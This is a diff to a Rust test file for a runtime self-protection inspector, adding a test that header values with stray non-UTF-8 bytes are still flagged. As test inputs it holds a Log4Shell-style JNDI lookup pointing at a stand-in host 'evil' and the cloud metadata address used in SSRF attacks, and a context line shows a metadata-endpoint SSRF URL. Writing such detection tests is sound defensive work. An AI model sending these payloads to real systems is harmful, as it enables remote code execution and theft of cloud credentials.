@@ -74,6 +74,26 @@ fn test_rasp_header_inspection() {
 }
 
 #[test]
+fn obs_text_bytes_cannot_hide_a_header_payload() {
+    for (name, value) in [
+        ("user-agent", &b"${jndi:ldap://evil/a}\xff"[..]),
+        ("x-forwarded-host", &b"169.254.169.254\xff"[..]),
+    ] {
+        let value = HeaderValue::from_bytes(value).unwrap();
+        assert!(value.to_str().is_err());
+        let mut headers = HeaderMap::new();
+        headers.insert(name, value);
+        assert!(RaspInspector::inspect_headers(&headers), "{name}");
+    }
+    let mut clean = HeaderMap::new();
+    clean.insert(
+        "user-agent",
+        HeaderValue::from_bytes(b"Mozilla/5.0 caf\xe9").unwrap(),
+    );
+    assert!(!RaspInspector::inspect_headers(&clean));
+}
+
+#[test]
 fn test_rasp_ssrf_and_rce_detection() {
     assert!(RaspInspector::inspect_uri(
         "/proxy?url=http://169.254.169.254/latest/meta-data"
